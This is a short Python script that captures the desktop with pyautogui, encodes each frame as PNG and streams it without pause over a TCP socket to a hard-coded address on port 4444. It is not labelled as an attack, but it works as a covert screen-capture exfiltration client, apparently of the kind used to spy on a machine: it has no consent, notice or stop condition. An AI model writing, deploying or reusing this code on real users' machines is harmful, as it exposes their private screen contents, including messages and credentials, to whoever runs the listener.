import sys
from PyQt5.QtWidgets import QApplication
from PyQt5.QtGui import QImage, QPixmap
from PyQt5.QtCore import QBuffer, QIODevice
import pyautogui
import socket
import io

def capture_screenshot():
    # Capture the screenshot
    screenshot = pyautogui.screenshot()
    # Convert to QImage
    img = QImage(screenshot.tobytes(), screenshot.width, screenshot.height, screenshot.width * 3, QImage.Format_RGB888)
    return img

def send_screenshot(client_socket):
    try:
        # Capture the screenshot
        img = capture_screenshot()
        
        # Save QImage to a QBuffer (in-memory buffer)
        buffer = QBuffer()
        buffer.open(QIODevice.ReadWrite)
        img.save(buffer, 'PNG')
        buffer.seek(0)
        
        # Send the image data
        image_data = buffer.readAll()
        client_socket.sendall(image_data)
    except Exception as e:
        print(f"Error capturing or sending screenshot: {e}")

def main():
    # Connect to the server
    ip = "172.26.136.52"  # Replace with your server's IP address
    port = 4444
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((ip, port))

    # Send screenshots periodically
    while True:
        send_screenshot(client_socket)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    main()
